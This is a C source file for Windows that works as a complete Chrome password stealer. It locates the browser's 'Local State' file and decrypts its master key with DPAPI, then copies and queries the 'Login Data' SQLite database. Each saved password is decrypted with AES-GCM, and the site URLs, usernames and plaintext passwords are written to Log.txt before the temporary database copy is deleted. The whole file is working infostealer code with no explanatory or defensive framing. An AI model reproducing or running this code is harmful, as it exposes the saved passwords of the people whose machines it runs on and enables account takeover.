#include <windows.h>
#include <Wincrypt.h>
#include <bcrypt.h>
#include "sqlite3.h"

#pragma comment (lib, "Crypt32.lib")
#pragma comment (lib, "Bcrypt.lib")

#define DB_STRING L"Tmp.db"
#define LOG_FILE L"Log.txt"
#define AES_BLOCK_SIZE 16
#define CIPHER_SIZE 12
#define CHROME_V10_HEADER_SIZE 3
#define NULL_TERMINATION_PADDING 1

#pragma warning(disable: 28251)
#define WMAX_PATH (MAX_PATH * sizeof(WCHAR))
#define ERROR_NO_RETURN_VALUE 0

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

DATA_BLOB GlobalBlob;
HANDLE Log;

SIZE_T StringLength(LPCWSTR String)
{
	LPCWSTR String2;

	for (String2 = String; *String2; ++String2);

	return (String2 - String);
}

SIZE_T StringLengthA(LPCSTR String)
{
	LPCSTR String2;

	for (String2 = String; *String2; ++String2);

	return (String2 - String);
}

INT StringCompareStringRegionA(PCHAR String1, PCHAR String2, SIZE_T Count)
{
	UCHAR Block1, Block2;
	while (Count-- > 0)
	{
		Block1 = (UCHAR)*String1++;
		Block2 = (UCHAR)*String2++;

		if (Block1 != Block2)
			return Block1 - Block2;

		if (Block1 == '\0')
			return 0;
	}

	return 0;
}

PWCHAR StringCopyW(PWCHAR String1, PWCHAR String2)
{
	PWCHAR p = String1;

	while ((*p++ = *String2++) != 0);

	return String1;
}

PWCHAR StringConcatW(PWCHAR String, PWCHAR String2)
{
	StringCopyW(&String[StringLength(String)], String2);

	return String;
}

PCHAR StringCopyA(PCHAR String1, PCHAR String2)
{
	PCHAR p = String1;

	while ((*p++ = *String2++) != 0);

	return String1;
}

PCHAR StringConcatA(PCHAR String, PCHAR String2)
{
	StringCopyA(&String[StringLengthA(String)], String2);

	return String;
}

BOOL PdIsPathValid(PWCHAR FilePath)
{
	HANDLE hFile = INVALID_HANDLE_VALUE;

	hFile = CreateFileW(FilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		if (GetLastError() == ERROR_SHARING_VIOLATION)
			return TRUE;
		else
			return FALSE;
	}

	if (hFile)
		CloseHandle(hFile);

	return TRUE;
}

PCHAR StringLocateCharA(PCHAR String, INT Character)
{
	do 
	{
		if (*String == Character)
			return (PCHAR)String;

	} while (*String++);

	return NULL;
}

PCHAR StringFindSubstringA(PCHAR String1, PCHAR String2)
{
	PCHAR pPointer = String1;
	DWORD Length = (DWORD)StringLengthA(String2);

	for (; (pPointer = StringLocateCharA(pPointer, *String2)) != 0; pPointer++)
	{
		if (StringCompareStringRegionA(pPointer, String2, Length) == 0)
			return (PCHAR)pPointer;
	}

	return NULL;
}

PCHAR StringRemoveSubstring(PCHAR String, CONST PCHAR Substring)
{
	DWORD Length = (DWORD)StringLengthA(Substring);
	PCHAR pPointer = String;

	if (Length == 0)
		return NULL;

	while ((pPointer = StringFindSubstringA(pPointer, Substring)) != NULL)
		MoveMemory(pPointer, pPointer + Length, StringLengthA(pPointer + Length) + 1);

	return String;
}

PCHAR StringTerminateStringAtCharA(PCHAR String, INT Character)
{
	DWORD Length = (DWORD)StringLengthA(String);

	for (DWORD Index = 0; Index < Length; Index++)
	{
		if (String[Index] == Character)
		{
			String[Index] = '\0';
			return String;
		}
	}

	return NULL;
}

BOOL CreateLocalAppDataObjectPath(PWCHAR pBuffer, PWCHAR Path, DWORD Size, BOOL bFlag)
{
	if (pBuffer == NULL)
		return FALSE;

	if (GetEnvironmentVariableW(L"LOCALAPPDATA", pBuffer, Size) == ERROR_NO_RETURN_VALUE)
		return FALSE;

	if (StringConcatW(pBuffer, Path) == ERROR_NO_RETURN_VALUE)
		return FALSE;

	if (bFlag)
	{
		if (!PdIsPathValid(pBuffer))
			return FALSE;
	}
	
	return TRUE;
}

VOID CharArrayToByteArray(PCHAR Char, PBYTE Byte, DWORD Length)
{
	for (DWORD dwX = 0; dwX < Length; dwX++)
	{
		Byte[dwX] = (BYTE)Char[dwX];
	}
}

BOOL RtlLoadMasterKey(PWCHAR Path)
{
	PCHAR Substring = NULL;
	PBYTE Decoded = NULL;
	DATA_BLOB In = { 0 };
	DATA_BLOB Out = { 0 };

	DWORD dwLength = 0;

	HANDLE hHandle = INVALID_HANDLE_VALUE;
	DWORD dwError = ERROR_SUCCESS;
	DWORD dwBytesRead = 0;

	hHandle = CreateFile(Path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hHandle == INVALID_HANDLE_VALUE)
		goto FAILURE;

	dwError = GetFileSize(hHandle, NULL);
	if (dwError == INVALID_FILE_SIZE)
		goto FAILURE;

	Substring = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwError);
	if (Substring == NULL)
		goto FAILURE;

	if (!ReadFile(hHandle, Substring, dwError, &dwBytesRead, NULL))
		goto FAILURE;

	Substring = StringFindSubstringA(Substring, (PCHAR)"\"os_crypt\":{\"encrypted_key\":\"");
	if (Substring == NULL)
		goto FAILURE;

	if (StringRemoveSubstring(Substring, (PCHAR)"\"os_crypt\":{\"encrypted_key\":\"") == NULL)
		goto FAILURE;

	if (StringTerminateStringAtCharA(Substring, '"') == NULL)
		goto FAILURE;

	if (!CryptStringToBinaryA(Substring, (DWORD)StringLengthA(Substring), CRYPT_STRING_BASE64, NULL, &dwLength, NULL, NULL))
		goto FAILURE;

	Decoded = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, StringLengthA(Substring) + 1);
	if (Decoded == NULL)
		goto FAILURE;

	if (!CryptStringToBinaryA(Substring, (DWORD)StringLengthA(Substring), CRYPT_STRING_BASE64, Decoded, &dwLength, NULL, NULL))
		goto FAILURE;

	Decoded += 5;
	dwLength -= 5;

	In.cbData = dwLength;
	In.pbData = Decoded;

	if (!CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &GlobalBlob))
		goto FAILURE;

	if (hHandle)
		CloseHandle(hHandle);

	return TRUE;

FAILURE:

	dwError = GetLastError();

	if (hHandle)
		CloseHandle(hHandle);

	if (Decoded)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Decoded);

	if(Substring)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Substring);

	SetLastError(dwError);

	return FALSE;
}

VOID DisposeOfPathObject(PWCHAR Path)
{
	ZeroMemory(Path, sizeof(Path));
}

BOOL WriteDecryptedDataToDisk(PCHAR Url, PCHAR Username, PBYTE Password)
{
	CHAR WriteArray[512] = { 0 };
	DWORD nNumberOfBytesToWrite = 0;
	DWORD lpNumberOfBytesWritten = 0;

	if (StringCopyA(WriteArray, (PCHAR)"Url: ") == NULL) return FALSE;
	if (StringConcatA(WriteArray, Url) == NULL) return FALSE;
	if (StringConcatA(WriteArray, (PCHAR)"\r\n") == NULL) return FALSE;

	if (StringConcatA(WriteArray, (PCHAR)"Username: ") == NULL) return FALSE;
	if (StringConcatA(WriteArray, Username) == NULL) return FALSE;
	if (StringConcatA(WriteArray, (PCHAR)"\r\n") == NULL) return FALSE;

	if (StringConcatA(WriteArray, (PCHAR)"Password: ") == NULL) return FALSE;
	if (StringConcatA(WriteArray, (PCHAR)Password) == NULL) return FALSE;
	if (StringConcatA(WriteArray, (PCHAR)"\r\n\n") == NULL) return FALSE;

	nNumberOfBytesToWrite = (DWORD)StringLengthA(WriteArray);

	return WriteFile(Log, WriteArray, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, NULL);
}

INT CallbackSqlite3QueryObjectRoutine(PVOID DatabaseObject, INT Argc, PCHAR* Argv, PCHAR* ColumnName)
{
	CHAR PasswordIv[MAX_PATH] = { 0 };
	PBYTE IvPointer = NULL;

	BCRYPT_ALG_HANDLE Handle = NULL;
	BCRYPT_KEY_HANDLE phKey = NULL;
	NTSTATUS Status = ERROR_SUCCESS;

	DWORD dwError = ERROR_SUCCESS;

	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO Info;

	PBYTE pbInitIv = NULL;
	ULONG IvLength = (ULONG)StringLengthA(Argv[2]);

	PBYTE DecryptedData = NULL;
	ULONG DecryptedSize = 0;

	if (IvLength < 32)
	{
		//known issue
		return (INT)ERROR_SUCCESS;
	}

	CopyMemory(PasswordIv, Argv[2], IvLength);

	pbInitIv = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, IvLength);
	if (pbInitIv == NULL)
		goto FAILURE;

	CharArrayToByteArray(PasswordIv, pbInitIv, IvLength);
	IvPointer = pbInitIv;
	IvPointer += 3;

	Status = BCryptOpenAlgorithmProvider(&Handle, L"AES", NULL, 0);
	if (!NT_SUCCESS(Status))
		return (INT)GetLastError();

	Status = BCryptSetProperty(Handle, L"ChainingMode", (PUCHAR)L"ChainingModeGCM", 0, 0);
	if (!NT_SUCCESS(Status))
		goto FAILURE;

	Status = BCryptGenerateSymmetricKey(Handle, &phKey, NULL, 0, GlobalBlob.pbData, GlobalBlob.cbData, 0);
	if (!NT_SUCCESS(Status))
		goto FAILURE;

	BCRYPT_INIT_AUTH_MODE_INFO(Info);
	Info.pbNonce = IvPointer;
	Info.cbNonce = CIPHER_SIZE;
	Info.pbTag = (Info.pbNonce + IvLength - (CHROME_V10_HEADER_SIZE + AES_BLOCK_SIZE));
	Info.cbTag = AES_BLOCK_SIZE;

	dwError = IvLength - CHROME_V10_HEADER_SIZE - Info.cbNonce -Info.cbTag;
#pragma warning( push )
#pragma warning( disable : 26451)
	DecryptedData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwError + NULL_TERMINATION_PADDING);
	if (DecryptedData == NULL)
		goto FAILURE;
#pragma warning( pop ) 

	Status = BCryptDecrypt(phKey, (Info.pbNonce + Info.cbNonce), dwError, &Info, NULL, 0, DecryptedData, dwError, &DecryptedSize, 0);
	if (!NT_SUCCESS(Status))
		goto FAILURE;

	WriteDecryptedDataToDisk(Argv[0], Argv[1], DecryptedData);

	if (pbInitIv)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pbInitIv);

	IvPointer = NULL;

	if (phKey)
		BCryptDestroyKey(phKey);

	if (Handle)
		BCryptCloseAlgorithmProvider(Handle, 0);

	if (DecryptedData)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, DecryptedData);

	return (INT)ERROR_SUCCESS;

FAILURE:

	dwError = GetLastError();

	if (pbInitIv)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pbInitIv);

#pragma warning( push )
#pragma warning( disable : 6001)
	if (phKey)
		BCryptDestroyKey(phKey);
#pragma warning( pop ) 

	if (Handle)
		BCryptCloseAlgorithmProvider(Handle, 0);

	if (DecryptedData)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, DecryptedData);

	return (INT)dwError;
}

BOOL DeleteFileInternal(PWCHAR Path)
{
	HANDLE hHandle = INVALID_HANDLE_VALUE;

	if (Path == NULL)
		return FALSE;

	if (!PdIsPathValid(Path))
		return FALSE;

	hHandle = CreateFileW(Path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
	if (hHandle == INVALID_HANDLE_VALUE)
		return FALSE;

	if (hHandle)
		CloseHandle(hHandle);

	return TRUE;
}

BOOL GetSqlite3ChromeDbData(VOID)
{
	sqlite3* DatabaseObject = NULL;
	DWORD dwError = ERROR_SUCCESS;
	INT Result = ERROR_SUCCESS;
	PCHAR Error = NULL;

	Result = sqlite3_open_v2("Tmp.db", &DatabaseObject, SQLITE_OPEN_READONLY, NULL);
	if (Result != ERROR_SUCCESS)
		goto FAILURE;

	Log = CreateFileW(LOG_FILE, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (Log == INVALID_HANDLE_VALUE)
		goto FAILURE;

	Result = sqlite3_exec(DatabaseObject, "SELECT ORIGIN_URL,USERNAME_VALUE,PASSWORD_VALUE FROM LOGINS", CallbackSqlite3QueryObjectRoutine, DatabaseObject, &Error);
	if (Result != ERROR_SUCCESS)
		goto FAILURE;

	if (DatabaseObject)
		sqlite3_close(DatabaseObject);

	if (Log)
		CloseHandle(Log);

	return TRUE;

FAILURE:

	if (DatabaseObject)
		sqlite3_close(DatabaseObject);

	if (Log)
		CloseHandle(Log);

	return FALSE;
}

INT main(VOID)
{
	DWORD dwError = ERROR_SUCCESS;
	WCHAR ChromePath[WMAX_PATH] = { 0 };
	BOOL bExists = FALSE;
	WCHAR Tmp[WMAX_PATH] = { 0 };

	typedef enum { Chrome = 0, FireFox = 1, Other = 2} BrowserTargets;

	if (!CreateLocalAppDataObjectPath(ChromePath, (PWCHAR)L"\\Google\\Chrome\\User Data\\Local State", WMAX_PATH, TRUE))
		goto FAILURE;

	if(!RtlLoadMasterKey(ChromePath))
		goto FAILURE;

	DisposeOfPathObject(ChromePath);

	if (!CreateLocalAppDataObjectPath(ChromePath, (PWCHAR)L"\\Google\\Chrome\\User Data\\Default\\Login Data", WMAX_PATH, TRUE))
		goto FAILURE;

	if (!CreateLocalAppDataObjectPath(Tmp, (PWCHAR)L"\\Google\\Chrome\\User Data\\Default\\", WMAX_PATH, FALSE))
		goto FAILURE;

	if (!SetCurrentDirectoryW(Tmp))
		goto FAILURE;

	DisposeOfPathObject(Tmp);

	if (!CopyFile(ChromePath, DB_STRING, TRUE))
		goto FAILURE;

	bExists = TRUE;

	if (!GetSqlite3ChromeDbData())
		goto FAILURE;
		
	if (!DeleteFileInternal((PWCHAR)DB_STRING))
		goto FAILURE;

	if (GlobalBlob.pbData)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, GlobalBlob.pbData);

	return ERROR_SUCCESS;

FAILURE:

	dwError = GetLastError();

	if (bExists)
		DeleteFileInternal((PWCHAR)DB_STRING);

	if (GlobalBlob.pbData)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, GlobalBlob.pbData);

	return dwError;
}

